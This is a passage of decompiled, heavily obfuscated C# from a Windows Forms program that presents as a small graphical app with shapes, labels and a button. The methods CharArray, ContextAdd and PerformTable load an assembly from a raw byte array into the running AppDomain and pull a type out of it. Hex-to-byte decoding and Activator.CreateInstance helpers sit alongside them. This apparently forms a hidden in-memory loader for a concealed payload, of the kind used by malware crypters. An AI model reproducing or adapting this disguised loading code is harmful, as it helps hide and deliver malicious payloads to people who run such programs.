					Form1.smethod_61((Control)(object)pictureBox1, "pictureBox1");
					num = ((int)num2 * -670438248) ^ -2068169517;
					continue;
				case 22u:
					Form1.smethod_71((TextBoxBase)(object)richTextBox1, bool_0: true);
					num = ((int)num2 * -835562733) ^ -762136805;
					continue;
				case 21u:
					num = ((int)num2 * -957560219) ^ -708907476;
					continue;
				case 20u:
					panel1 = Form1.smethod_55();
					num = ((int)num2 * -1569344340) ^ 0x6F876B73;
					continue;
				case 19u:
					button1 = Form1.smethod_53();
					richTextBox1 = Form1.smethod_54();
					num = ((int)num2 * -916610347) ^ -2103878028;
					continue;
				case 18u:
					Form1.smethod_59((Control)(object)this);
					num = (int)(num2 * 821664302) ^ -65822393;
					continue;
				case 17u:
					Form1.smethod_83((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -1502182325) ^ -1530054101;
					continue;
				case 16u:
					num = ((int)num2 * -946680004) ^ -1871054093;
					continue;
				case 15u:
					Form1.smethod_3((Control)(object)pictureBox1, new Size(246, 246));
					num = (int)(num2 * 1177932929) ^ -2037140946;
					continue;
				case 14u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)panel1);
					num = (int)((num2 * 1669072438) ^ 0x67B49348);
					continue;
				case 13u:
					num = ((int)num2 * -226693102) ^ 0x6CDBA8B5;
					continue;
				case 12u:
					Form1.smethod_3((Control)(object)label5, new Size(0, 16));
					num = ((int)num2 * -1652932046) ^ 0x66BA620B;
					continue;
				case 11u:
					num = ((int)num2 * -1168107563) ^ 0x5074D8FE;
					continue;
				case 10u:
					label2 = Form1.smethod_57();
					label5 = Form1.smethod_57();
					num = (int)(num2 * 886788305) ^ -1720532030;
					continue;
				case 9u:
					num = (int)((num2 * 279773951) ^ 0x79D6D788);
					continue;
				case 8u:
					Form1.smethod_91((Control)(object)this, bool_0: false);
					num = (int)((num2 * 105787836) ^ 0x36DE98DD);
					continue;
				case 7u:
					Form1.smethod_67((Control)(object)button1, (EventHandler)Button1_Click);
					num = (int)((num2 * 722695038) ^ 0x3069065A);
					continue;
				case 6u:
					num = ((int)num2 * -1755312963) ^ 0x60BC6271;
					continue;
				case 5u:
					Form1.smethod_64((Control)(object)label5, 12);
					Form1.smethod_74((Control)(object)label6, bool_0: true);
					num = (int)(num2 * 1462001101) ^ -1309835420;
					continue;
				case 4u:
					Form1.smethod_5((Control)(object)richTextBox1, Color.White);
					num = (int)((num2 * 1025180018) ^ 0x7C7BD70B);
					continue;
				case 3u:
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label5);
					Form1.smethod_9(Form1.smethod_82((Control)(object)this), (Control)(object)label2);
					num = (int)(num2 * 282281190) ^ -238784427;
					continue;
				case 2u:
					Form1.smethod_78((Control)(object)label1, (RightToLeft)0);
					num = ((int)num2 * -211933794) ^ 0x23233D22;
					continue;
				case 1u:
					label1 = Form1.smethod_57();
					num = (int)(num2 * 110699047) ^ -926953842;
					continue;
				case 0u:
					Form1.smethod_66((ButtonBase)(object)button1, bool_0: true);
					num = ((int)num2 * -202868640) ^ -1625554086;
					continue;
				case 31u:
					break;
				default:
					Form1.smethod_92((Control)(object)this);
					return;
				}
				break;
			}
		}
	}

	private static void CharArray(byte[] Level, string po)
	{
		Assembly q = default(Assembly);
		while (true)
		{
			int num = -925686274;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xED351D12u) % 5u)
				{
				case 4u:
					q = ContextAdd(Level);
					num = ((int)num2 * -2115905222) ^ 0xB563E96;
					continue;
				case 3u:
					PerformTable(q);
					num = ((int)num2 * -2001000048) ^ 0x523A5206;
					continue;
				case 0u:
					num = ((int)num2 * -39172659) ^ -1898210328;
					continue;
				default:
					return;
				case 2u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private static Assembly ContextAdd(byte[] Position)
	{
		Assembly result = Form1.smethod_94(Form1.smethod_93(), Position);
		while (true)
		{
			int num = -1016284386;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xAB1227FDu) % 3u)
				{
				case 1u:
					goto IL_000e;
				case 0u:
					break;
				default:
					return result;
				}
				break;
				IL_000e:
				num = (int)((num2 * 1165701812) ^ 0x5F55BBDF);
			}
		}
	}

	private static void PerformTable(Assembly Q3)
	{
		ComMember = Form1.smethod_95(Q3)[24];
	}

	static Random smethod_0()
	{
		return new Random();
	}

	static void smethod_1(RichTextBox richTextBox_0, HorizontalAlignment horizontalAlignment_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		richTextBox_0.set_SelectionAlignment(horizontalAlignment_0);
	}

	static PictureBox smethod_2()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new PictureBox();
	}

	static void smethod_3(Control control_0, Size size_0)
	{
		control_0.set_Size(size_0);
	}

	static void smethod_4(Control control_0, Point point_0)
	{
		control_0.set_Location(point_0);
	}

	static void smethod_5(Control control_0, Color color_0)
	{
		control_0.set_BackColor(color_0);
	}

	static void smethod_6(Control control_0, MouseEventHandler mouseEventHandler_0)
	{
		control_0.add_MouseDown(mouseEventHandler_0);
	}

	static void smethod_7(Control control_0, bool bool_0)
	{
		control_0.set_Enabled(bool_0);
	}

	static ControlCollection smethod_8(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_9(ControlCollection controlCollection_0, Control control_0)
	{
		controlCollection_0.Add(control_0);
	}

	static void smethod_10(Form form_0, Form form_1)
	{
		form_0.set_Owner(form_1);
	}

	static void smethod_11(Control control_0)
	{
		control_0.Show();
	}

	static Point smethod_12(Form form_0)
	{
		return form_0.get_Location();
	}

	static void smethod_13(Form form_0, Point point_0)
	{
		form_0.set_Location(point_0);
	}

	static void smethod_14(Form form_0)
	{
		form_0.Activate();
	}

	static void smethod_15(Timer timer_0)
	{
		timer_0.Stop();
	}

	static int smethod_16(Control control_0)
	{
		return control_0.get_Height();
	}

	static void smethod_17(Control control_0, int int_0)
	{
		control_0.set_Height(int_0);
	}

	static int smethod_18(Control control_0)
	{
		return control_0.get_Width();
	}

	static Bitmap smethod_19(int int_0, int int_1)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Bitmap(int_0, int_1);
	}

	static void smethod_20(PictureBox pictureBox_0, Image image_0)
	{
		pictureBox_0.set_Image(image_0);
	}

	static Image smethod_21(PictureBox pictureBox_0)
	{
		return pictureBox_0.get_Image();
	}

	static Graphics smethod_22(Image image_0)
	{
		return Graphics.FromImage(image_0);
	}

	static Brush smethod_23()
	{
		return Brushes.get_OldLace();
	}

	static void smethod_24(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillEllipse(brush_0, float_0, float_1, float_2, float_3);
	}

	static Brush smethod_25()
	{
		return Brushes.get_Sienna();
	}

	static Brush smethod_26()
	{
		return Brushes.get_BurlyWood();
	}

	static double smethod_27(double double_0)
	{
		return Math.Sqrt(double_0);
	}

	static void smethod_28(Graphics graphics_0, Brush brush_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.FillRectangle(brush_0, float_0, float_1, float_2, float_3);
	}

	static SolidBrush smethod_29(Color color_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new SolidBrush(color_0);
	}

	static void smethod_30(Control control_0)
	{
		control_0.Refresh();
	}

	static EventArgs smethod_31()
	{
		return new EventArgs();
	}

	static void smethod_32(Control control_0, string string_0)
	{
		control_0.set_Text(string_0);
	}

	static int smethod_33(Random random_0, int int_0)
	{
		return random_0.Next(int_0);
	}

	static string smethod_34(string string_0, string string_1)
	{
		return string_0 + string_1;
	}

	static void smethod_35(Timer timer_0, bool bool_0)
	{
		timer_0.set_Enabled(bool_0);
	}

	static void smethod_36(Timer timer_0)
	{
		timer_0.Start();
	}

	static Point smethod_37(Control control_0)
	{
		return control_0.get_Location();
	}

	static int smethod_38(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_X();
	}

	static int smethod_39(MouseEventArgs mouseEventArgs_0)
	{
		return mouseEventArgs_0.get_Y();
	}

	static Color smethod_40(Bitmap bitmap_0, int int_0, int int_1)
	{
		return bitmap_0.GetPixel(int_0, int_1);
	}

	static Color smethod_41(Control control_0)
	{
		return control_0.get_BackColor();
	}

	static Pen smethod_42(Color color_0, float float_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Expected O, but got Unknown
		return new Pen(color_0, float_0);
	}

	static void smethod_43(Graphics graphics_0, Pen pen_0, float float_0, float float_1, float float_2, float float_3)
	{
		graphics_0.DrawEllipse(pen_0, float_0, float_1, float_2, float_3);
	}

	static void smethod_44(Graphics graphics_0, Image image_0, int int_0, int int_1, Rectangle rectangle_0, GraphicsUnit graphicsUnit_0)
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		graphics_0.DrawImage(image_0, int_0, int_1, rectangle_0, graphicsUnit_0);
	}

	static void smethod_45(Graphics graphics_0)
	{
		graphics_0.Dispose();
	}

	static bool smethod_46(Control control_0)
	{
		return control_0.get_Enabled();
	}

	static void smethod_47(int int_0)
	{
		Thread.Sleep(int_0);
	}

	static object smethod_48(Array array_0)
	{
		return array_0.Clone();
	}

	static int smethod_49(Control control_0)
	{
		return control_0.get_Width();
	}

	static void smethod_50(Control control_0, int int_0)
	{
		control_0.set_Left(int_0);
	}

	static void smethod_51(IDisposable idisposable_0)
	{
		idisposable_0.Dispose();
	}

	static Container smethod_52()
	{
		return new Container();
	}

	static Button smethod_53()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Button();
	}

	static RichTextBox smethod_54()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new RichTextBox();
	}

	static Panel smethod_55()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Panel();
	}

	static Timer smethod_56(IContainer icontainer_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		return new Timer(icontainer_0);
	}

	static Label smethod_57()
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		return new Label();
	}

	static void smethod_58(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.BeginInit();
	}

	static void smethod_59(Control control_0)
	{
		control_0.SuspendLayout();
	}

	static void smethod_60(PictureBox pictureBox_0, BorderStyle borderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		pictureBox_0.set_BorderStyle(borderStyle_0);
	}

	static void smethod_61(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_62(PictureBox pictureBox_0, int int_0)
	{
		pictureBox_0.set_TabIndex(int_0);
	}

	static void smethod_63(PictureBox pictureBox_0, bool bool_0)
	{
		pictureBox_0.set_TabStop(bool_0);
	}

	static void smethod_64(Control control_0, int int_0)
	{
		control_0.set_TabIndex(int_0);
	}

	static void smethod_65(Control control_0, bool bool_0)
	{
		control_0.set_TabStop(bool_0);
	}

	static void smethod_66(ButtonBase buttonBase_0, bool bool_0)
	{
		buttonBase_0.set_UseVisualStyleBackColor(bool_0);
	}

	static void smethod_67(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_Click(eventHandler_0);
	}

	static string smethod_68(string string_0, int int_0, int int_1)
	{
		return string_0.Substring(int_0, int_1);
	}

	static byte smethod_69(string string_0, int int_0)
	{
		return Convert.ToByte(string_0, int_0);
	}

	static object smethod_70(Type type_0, object[] object_0)
	{
		return Activator.CreateInstance(type_0, object_0);
	}

	static void smethod_71(TextBoxBase textBoxBase_0, bool bool_0)
	{
		textBoxBase_0.set_ReadOnly(bool_0);
	}

	static void smethod_72(Timer timer_0, int int_0)
	{
		timer_0.set_Interval(int_0);
	}

	static void smethod_73(Timer timer_0, EventHandler eventHandler_0)
	{
		timer_0.add_Tick(eventHandler_0);
	}

	static void smethod_74(Control control_0, bool bool_0)
	{
		control_0.set_AutoSize(bool_0);
	}

	static void smethod_75(Control control_0, DockStyle dockStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_Dock(dockStyle_0);
	}

	static Font smethod_76(string string_0, float float_0, FontStyle fontStyle_0, GraphicsUnit graphicsUnit_0, byte byte_0)
	{
		//IL_0002: Unknown result type (might be due to invalid IL or missing references)
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		return new Font(string_0, float_0, fontStyle_0, graphicsUnit_0, byte_0);
	}

	static void smethod_77(Control control_0, Font font_0)
	{
		control_0.set_Font(font_0);
	}

	static void smethod_78(Control control_0, RightToLeft rightToLeft_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		control_0.set_RightToLeft(rightToLeft_0);
	}

	static void smethod_79(ContainerControl containerControl_0, SizeF sizeF_0)
	{
		containerControl_0.set_AutoScaleDimensions(sizeF_0);
	}

	static void smethod_80(ContainerControl containerControl_0, AutoScaleMode autoScaleMode_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		containerControl_0.set_AutoScaleMode(autoScaleMode_0);
	}

	static void smethod_81(Form form_0, Size size_0)
	{
		form_0.set_ClientSize(size_0);
	}

	static ControlCollection smethod_82(Control control_0)
	{
		return control_0.get_Controls();
	}

	static void smethod_83(Form form_0, FormBorderStyle formBorderStyle_0)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		form_0.set_FormBorderStyle(formBorderStyle_0);
	}

	static void smethod_84(Form form_0, bool bool_0)
	{
		form_0.set_MaximizeBox(bool_0);
	}

	static void smethod_85(Control control_0, string string_0)
	{
		control_0.set_Name(string_0);
	}

	static void smethod_86(Form form_0, bool bool_0)
	{
		form_0.set_ShowIcon(bool_0);
	}

	static void smethod_87(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Load(eventHandler_0);
	}

	static void smethod_88(Form form_0, EventHandler eventHandler_0)
	{
		form_0.add_Shown(eventHandler_0);
	}

	static void smethod_89(Control control_0, EventHandler eventHandler_0)
	{
		control_0.add_LocationChanged(eventHandler_0);
	}

	static void smethod_90(ISupportInitialize isupportInitialize_0)
	{
		isupportInitialize_0.EndInit();
	}

	static void smethod_91(Control control_0, bool bool_0)
	{
		control_0.ResumeLayout(bool_0);
	}

	static void smethod_92(Control control_0)
	{
		control_0.PerformLayout();
	}

	static AppDomain smethod_93()
	{
		return AppDomain.CurrentDomain;
	}

	static Assembly smethod_94(AppDomain appDomain_0, byte[] byte_0)
	{
		return appDomain_0.Load(byte_0);
	}

	static Type[] smethod_95(Assembly assembly_0)
	{
		return assembly_0.GetTypes();
	}
}
